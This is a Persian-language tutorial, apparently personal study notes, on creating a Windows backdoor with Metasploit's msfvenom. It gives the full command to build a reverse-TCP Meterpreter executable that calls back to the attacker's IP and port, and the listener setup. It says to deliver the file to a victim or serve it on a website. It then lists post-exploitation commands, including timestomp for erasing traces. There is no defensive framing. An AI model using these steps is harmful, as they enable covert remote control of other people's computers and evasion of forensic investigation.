$\color{#b91646}{\textsf{MSFvenom backdoor}}$
=============================================

برنامه ی metasploit یه مکانیزمی داره برای درست کردن backdoor توی ویندوز

برنامه ی metasploit یک مجموعه ابزار بزرگیه که به ما اجازه میده exploit هایی که از قبل نوشته شده رو اجرا کنیم.

اینجا از ابزار **msfvenom** استفاده می کنیم.


ایده -> می خوام یه payload درست کنم که یه فایل exe. است. توی metasploit کالی یه سیستمی بذارم که شنود می کنه، در واقع منتظر connection است و در نهایت فایل exe. رو بفرستم برای یه سیستم ویندوزی که روی ماشینش اجرا بشه و بعد exe. به metasploitable وصل می شم و می تونیم از طریق متااسپلویت command هایی بزنیم که قربانی رو کنترل کنیم..

نوشتن برنامه ی exe. پیچیده است در نتیجه از metasploit framework درخواست می کنیم که همچین چیزی رو برامون بنویسه.

## $\color{#105652}{\textsf{Create payloads}}$

To create payloads  and then serve it on a website :D

`root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.117 LPORT=1234 --format=exe > attack.exe`

به MSFvenom بگم یه دونه فایل اجرایی به من بده که اون exploit خاص توش هست.

خودمون انتخاب می کنیم می خوایم از windows/meterpreter/reverse_tcp استفاده کنیم. (از نظر منطقی TCP connection می خوام و می خوام اون به من وصل بشه پس می شه reverse_tcp) -> payload

کانفیگ های local host و local port رو مشخص می کنیم. (باید بگیم وصل شه به چی. IP و Port سیستم خودمون که mfs روش هست رو میدیم.)

حالا به mfs می گیم چی درست کن یعنی format فایل درخواستی رو مشخص می کنیم.

می گیم چه payload ای رو در چه فرمتی بریز.

در نهایت خروجی رو در فایل attack.exe بریز.



## $\color{#105652}{\textsf{Listen with my PC}}$

`root@kali:~# msfconsole`

حالا به کامپیوتر خودمون می گیم به عنوان کسی که می خواد گوش بده اجرا کنه. شروع می کنه به وصل شدن. (به msf5 وصل شدیم)

`> db_staus`

برای اینکه مطمئن شیم سیستم بالاست می تونیم دستور db_status رو بزنیم.

`> use exploit/multi/handler`

از بین exploit ها multi/handler رو استفاده می کنیم.

`> set payload windows/meterpreter/reverse_tcp`

مشخص می کنیم از چه payload ای می خوایم استفاده کنیم. (همون payload ای که توی درست کردن فایل exe. استفاده کردیم.)

`> set LHOST 192.168.0.117`

`> set LPORT 1234`

یکسری confoig ها رو تنظیم می کنیم. -> همون local host و local port ای که توی ساخت payload تنظیم کرده بودیم.

`> exploit -j -z`

توی background می تونیم exploitمون رو اجرا کنیم.


## $\color{#105652}{\textsf{RUN in victim system}}$


حالا فایل exe. رو باید بفرستیم توی یه ماشین اجراش کنیم.

 به یه طریقی فایل رو به دست سیستم قربانی می رسونیم.

 قربانی فایل exe. رو اجرا می کنه و دسترسی به مهاجم از طریق msf داده می شه.

 ## $\color{#105652}{\textsf{Get ssesion in attacker system (msf)}}$

حالا که ارتباط برقرار شده بین قربانی و مهاجم، مهاجم می تونه command هایی که می خواد رو بزنه. -> **backdoor** ساختیم.

`> sessions -i`

همه ی session هایی که داریمو نشون میده. -> مثلا می فهمه که از ویندوز قربانی بهش وصل شدن.

`> sessions -i 1`

بین session ها با این دستور وصل می شه به session 1 

`> cd, ls, pwd, sysinfo, ipconfig, getuid, cat, timestomp, ...`

دستورات backdoor رو می زنیم و کار می کنیم.

با دستور sysinfo می تونیم اطلاعات مربوط به سیستم رو ببینیم.

با دستور timestomp می تونیم زمان فایل هارو دستکاری کنیم -> می تونیم یه فایل رو ادیت کنیم و بعد زمانش رو تغییر بدیم. (در خصوص پاک کردن ردپاها تاثیر داره)
